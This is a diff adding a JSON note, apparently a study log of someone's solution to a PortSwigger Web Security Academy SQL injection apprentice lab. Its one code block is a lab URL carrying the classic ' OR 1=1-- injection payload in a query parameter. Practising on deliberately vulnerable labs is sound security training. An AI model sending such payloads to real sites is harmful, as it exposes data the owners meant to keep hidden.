@@ -1,0 +1,36 @@
+{
+  "blocks": [
+    {
+      "id": "326042e6-0b87-80da-8e6b-c2aba9467d4a",
+      "language": "javascript",
+      "richText": [
+        {
+          "bold": false,
+          "code": false,
+          "href": null,
+          "italic": false,
+          "plainText": "https://0afc004d031e41e7821b8da800ce0074.web-security-academy.net/filter?category=%27+OR+1=1--"
+        }
+      ],
+      "type": "code"
+    }
+  ],
+  "category": "Apprentice",
+  "date": "2026-03-17",
+  "id": "326042e6-0b87-804d-a5dd-cc7e5d0b1163",
+  "properties": {
+    "Name": "SQLi - 1",
+    "Source": "Portswigger",
+    "Status": true,
+    "Tags": [
+      "SQLi"
+    ],
+    "Type": "Apprentice",
+    "URL": "https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data"
+  },
+  "slug": "https-portswigger-net-web-security-sql-injection-lab-retrieve-hidden-data",
+  "tags": [
+    "SQLi"
+  ],
+  "title": "SQLi - 1"
+}
